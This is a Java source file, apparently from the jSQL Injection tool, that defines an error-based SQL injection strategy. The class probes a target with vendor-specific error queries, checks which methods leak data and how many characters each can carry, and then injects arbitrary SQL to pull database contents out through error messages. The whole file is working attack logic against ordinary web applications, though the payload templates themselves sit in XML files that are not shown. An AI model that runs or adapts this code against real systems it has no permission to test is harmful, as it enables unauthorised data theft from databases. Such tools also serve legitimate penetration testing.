package com.jsql.model.injection.strategy;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.i18n.I18n;
import com.jsql.model.MediatorModel;
import com.jsql.model.accessible.DataAccess;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.StoppedByUserSlidingException;
import com.jsql.model.injection.vendor.xml.Model.Strategy;
import com.jsql.model.injection.vendor.xml.Model.Strategy.Configuration;
import com.jsql.model.injection.vendor.xml.Model.Strategy.Error.Method;
import com.jsql.model.injection.vendor.xml.VendorXml;
import com.jsql.model.suspendable.AbstractSuspendable;

/**
 * Injection strategy using error attack.
 */
public class StrategyInjectionError extends AbstractStrategy {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();
    
    // TODO Pojo injection
    private String[] tabCapacityMethod;
    
    // TODO Pojo injection
    private int indexMethod = 0;

    @Override
    public void checkApplicability() {
        // Reset applicability of new Vendor
        this.isApplicable = false;
        this.tabCapacityMethod = null;
        
        Strategy strategyXml = MediatorModel.model().getVendor().instance().getXmlModel().getStrategy();
        Configuration configurationXml = strategyXml.getConfiguration();
        
        if (strategyXml.getError() == null) {
            LOGGER.info("No Error strategy known for "+ MediatorModel.model().getVendor() +".");
            return;
        }

        LOGGER.trace(I18n.valueByKey("LOG_CHECKING_STRATEGY") +" Error...");
        
        this.tabCapacityMethod = new String[strategyXml.getError().getMethod().size()];
        int indexErrorMethod = 0;
        int errorCapacity = 0;
        for (Method errorMethod: strategyXml.getError().getMethod()) {
            boolean methodIsApplicable = false;
            LOGGER.trace(I18n.valueByKey("LOG_CHECKING") +" "+ errorMethod.getName() +"...");
        
            String performanceSourcePage = MediatorModel.model().injectWithoutIndex(
                " "+ VendorXml.replaceTags(
                    errorMethod.getQuery()
                    .replace("${WINDOW}", configurationXml.getSlidingWindow())
                    .replace("${INJECTION}", configurationXml.getFailsafe().replace("${INDICE}","0"))
                    .replace("${INDEX}", "1")
                    .replace("${CAPACITY}", Integer.toString(errorMethod.getCapacity()))
                )
            );
    
            if (performanceSourcePage.matches(
                VendorXml.replaceTags(
                    "(?s).*"+
                    configurationXml.getFailsafe()
                    .replace("${INDICE}","0")
                    .replace("0%2b1", "1")
                    // TODO postgres
                    .replace("(133707331)::text", "133707331")
                    +".*"
                )
            )) {
                methodIsApplicable = true;
                this.isApplicable = true;
            }
            
            if (methodIsApplicable) {
                String performanceErrorSourcePage = MediatorModel.model().injectWithoutIndex(
                    " "+ VendorXml.replaceTags(
                        errorMethod.getQuery()
                        .replace("${WINDOW}", configurationXml.getSlidingWindow())
                        .replace("${INJECTION}", configurationXml.getCalibrator())
                        .replace("${INDEX}", "1")
                        .replace("${CAPACITY}", Integer.toString(errorMethod.getCapacity()))
                    )
                );
                
                Matcher regexSearch = Pattern.compile("(?s)"+ DataAccess.LEAD +"(#+)").matcher(performanceErrorSourcePage);
                if (regexSearch.find()) {
                    regexSearch.reset();
                    while (regexSearch.find()) {
                        if (errorCapacity < regexSearch.group(1).length()) {
                            this.indexMethod = indexErrorMethod;
                        }
                        errorCapacity = regexSearch.group(1).length();
                        this.tabCapacityMethod[indexErrorMethod] = Integer.toString(errorCapacity);
                    }
                    LOGGER.debug(I18n.valueByKey("LOG_VULNERABLE") +" "+ errorMethod.getName() +" using "+ Integer.toString(errorCapacity) +" characters");
                } else {
                    LOGGER.warn(I18n.valueByKey("LOG_VULNERABLE") +" "+ errorMethod.getName() +" but injectable size is incorrect");
                    methodIsApplicable = false;
                }
            }
            
            if (methodIsApplicable) {
                this.allow(indexErrorMethod);
            } else {
                this.unallow(indexErrorMethod);
            }
            
            indexErrorMethod++;
        }
    }

    @Override
    public void allow() {
        this.markVulnerable(Interaction.MARK_ERROR_VULNERABLE);
    }

    @Override
    public void unallow() {
        this.markVulnerable(Interaction.MARK_ERROR_INVULNERABLE);
    }

    @Override
    public void allow(int i) {
        this.markVulnerable(Interaction.MARK_ERROR_VULNERABLE, i);
    }

    @Override
    public void unallow(int i) {
        this.markVulnerable(Interaction.MARK_ERROR_INVULNERABLE, i);
    }

    @Override
    public String inject(String sqlQuery, String startPosition, AbstractSuspendable<String> stoppable) throws StoppedByUserSlidingException {
        return MediatorModel.model().injectWithoutIndex(
            MediatorModel.model().getVendor().instance().sqlError(sqlQuery, startPosition)
        );
    }

    @Override
    public void activateStrategy() {
        LOGGER.info(
            I18n.valueByKey("LOG_USING_STRATEGY") +" ["
                + this.getName() +" "
                + MediatorModel.model().getVendor().instance().getXmlModel().getStrategy().getError().getMethod().get(this.indexMethod).getName()
            +"]"
        );
        MediatorModel.model().setStrategy(StrategyInjection.ERROR);
        
        Request request = new Request();
        request.setMessage(Interaction.MARK_ERROR_STRATEGY);
        MediatorModel.model().sendToViews(request);
    }
    
    @Override
    public String getPerformanceLength() {
        return this.tabCapacityMethod[this.indexMethod];
    }
    
    @Override
    public String getName() {
        return "Error";
    }
    
    @Override
    public Integer getIndexMethod() {
        return this.indexMethod;
    }
    
    public void setIndexMethod(int i) {
        this.indexMethod = i;
    }
    
}
